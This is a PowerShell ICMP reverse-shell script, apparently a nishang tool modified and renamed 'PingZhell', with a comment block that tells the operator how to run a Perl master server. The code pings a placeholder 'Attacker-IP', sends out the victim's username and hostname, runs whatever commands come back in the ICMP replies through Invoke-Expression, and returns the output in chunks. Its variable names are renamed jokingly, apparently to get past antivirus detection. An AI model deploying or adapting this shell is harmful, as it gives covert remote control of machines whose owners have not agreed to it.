
<#

Original script by nishang - modified by 0iphor13 for PingZhell

Use bunny.pl as a master

When running the master, don't forget to disable ICMP replies by the OS. For example:
$: sysctl -w net.ipv4.icmp_echo_ignore_all=1
Then:
$: perl bunny.pl

Microsoft please don't block, oh dear microsoft corporation
#>           
   

    $IPAddress = 'Attacker-IP'
    $Delay = 5
    $BufferSize = 128

    #Basic structure from http://stackoverflow.com/questions/20019053/sending-back-custom-icmp-echo-response
    $ICMPClientsWalkinDownTheStreet = New-Object System.Net.NetworkInformation.Ping
    $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
    $PingOptions.DontFragment = $True
    $MicrosoftCopyright =@"
 _______ ___ __    _ _______ _______ __   __ _______ ___     ___     
|       |   |  |  | |       |       |  | |  |       |   |   |   |    
|    _  |   |   |_| |    ___|____   |  |_|  |    ___|   |   |   |    
|   |_| |   |       |   | __ ____|  |       |   |___|   |   |   |    
|    ___|   |  _    |   ||  | ______|       |    ___|   |___|   |___ 
|   |   |   | | |   |   |_| | |_____|   _   |   |___|       |       |
|___|   |___|_|  |__|_______|_______|__| |__|_______|_______|_______|                       


Windows PowerShell running as user $env:username on $env:computername `n
"@;

    # Copyright Copies Right
    $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes($MicrosoftCopyright)
    $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions) | Out-Null

    #Does a german penguin just PingUin?
    $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
    $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions) | Out-Null

    while ($true)
    {
        $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes('')
        $reply = $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions)
        
        if ($reply.Buffer)
        {
            $response = ([text.encoding]::ASCII).GetString($reply.Buffer)
            $result = (Invoke-Expression -Command $response 2>&1 | Out-String )
            $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes($result)
            $index = [math]::floor($NeverGonnaGiveYouUp.length/$BufferSize)
            $i = 0

            #Fragmant larger output into smaller ones to send to the server.
            if ($NeverGonnaGiveYouUp.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    $NeverGonnaGiveYouUp2 = $NeverGonnaGiveYouUp[($i*$BufferSize)..(($i+1)*$BufferSize-1)]
                    $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 10000, $NeverGonnaGiveYouUp2, $PingOptions) | Out-Null
                    $i +=1
                }
                $remainingindex = $NeverGonnaGiveYouUp.Length % $BufferSize
                if ($remainingindex -ne 0)
                {
                    $NeverGonnaGiveYouUp2 = $NeverGonnaGiveYouUp[($i*$BufferSize)..($NeverGonnaGiveYouUp.Length)]
                    $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 10000, $NeverGonnaGiveYouUp2, $PingOptions) | Out-Null
                }
            }
            else
            {
                $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 10000, $NeverGonnaGiveYouUp, $PingOptions) | Out-Null
            }
            $NeverGonnaGiveYouUp = ([text.encoding]::ASCII).GetBytes("`nPS " + (Get-Location).Path + '> ')
            $ICMPClientsWalkinDownTheStreet.Send($IPAddress,60 * 1000, $NeverGonnaGiveYouUp, $PingOptions) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
